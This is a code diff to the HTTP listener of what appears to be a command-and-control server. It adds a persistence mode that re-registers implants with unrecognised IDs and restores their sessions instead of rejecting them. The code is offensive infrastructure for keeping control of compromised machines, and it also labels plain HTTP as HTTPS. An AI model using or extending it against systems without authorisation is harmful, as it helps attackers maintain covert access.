@@ -181,7 +181,7 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 
 		if register == true {
 
-			implant := core.RegisterImplant(getImplantArch, getUpdate, additionalFunctions)
+			implant := core.RegisterImplant(getImplantArch, getUpdate, additionalFunctions, "")
 
 			var protocol string
 			if r.TLS == nil {
@@ -214,11 +214,41 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if core.Sessions[getSessionID].Implant.ID != getUUID || getUUID == core.ZeroedUUID {
-		errorString := "http GET Request Invalid UUID, request ignored"
-		core.LogData(errorString)
-		returnErr := errors.New(errorString)
-		ErrorHandler(returnErr)
-		return
+
+		if core.PersistenceMode {
+			reconnectString := "Old implant with UUID: " + getUUID.String() + "connected, attempting to reestablish session..."
+			core.LogData(reconnectString)
+			core.WarningColorBold.Println(reconnectString)
+
+			implant := core.RegisterImplant(getImplantArch, getUpdate, additionalFunctions, getUUID.String())
+
+			var protocol string
+			if r.TLS == nil {
+				protocol = "HTTPS"
+			} else {
+				protocol = "HTTP"
+			}
+			core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")
+
+			newSession := core.SessionID - 1
+
+			response := map[string]interface{}{
+				"sessionID": newSession,
+				"UUID":      implant.ID,
+			}
+
+			json.NewEncoder(w).Encode(response)
+
+			core.BroadcastSession(strconv.Itoa(newSession))
+
+			return
+		} else {
+			errorString := "http GET Request Invalid UUID, request ignored"
+			core.LogData(errorString)
+			returnErr := errors.New(errorString)
+			ErrorHandler(returnErr)
+			return
+		}
 	}
 
 	if getData != "" {
@@ -420,7 +450,7 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 
 		if register == true {
 
-			implant := core.RegisterImplant(postImplantArch, postUpdate, additionalFunctions)
+			implant := core.RegisterImplant(postImplantArch, postUpdate, additionalFunctions, "")
 
 			var protocol string
 			if r.TLS == nil {
@@ -453,11 +483,42 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if core.Sessions[postSessionID].Implant.ID != postUUID || postUUID == core.ZeroedUUID {
-		errorString := "http POST Request Invalid UUID, request ignored"
-		core.LogData(errorString)
-		returnErr := errors.New(errorString)
-		ErrorHandler(returnErr)
-		return
+
+		if core.PersistenceMode {
+			reconnectString := "Old implant with UUID: " + postUUID.String() + "connected, attempting to reestablish session..."
+			core.LogData(reconnectString)
+			core.WarningColorBold.Println(reconnectString)
+
+			implant := core.RegisterImplant(postImplantArch, postUpdate, additionalFunctions, postUUID.String())
+
+			var protocol string
+			if r.TLS == nil {
+				protocol = "HTTPS"
+			} else {
+				protocol = "HTTP"
+			}
+			core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")
+
+			newSession := core.SessionID - 1
+
+			response := map[string]interface{}{
+				"sessionID": newSession,
+				"UUID":      implant.ID,
+			}
+
+			json.NewEncoder(w).Encode(response)
+
+			core.BroadcastSession(strconv.Itoa(newSession))
+
+			return
+		} else {
+			errorString := "http POST Request Invalid UUID, request ignored"
+			core.LogData(errorString)
+			returnErr := errors.New(errorString)
+			ErrorHandler(returnErr)
+			return
+		}
+
 	}
 
 	if postData != "" {
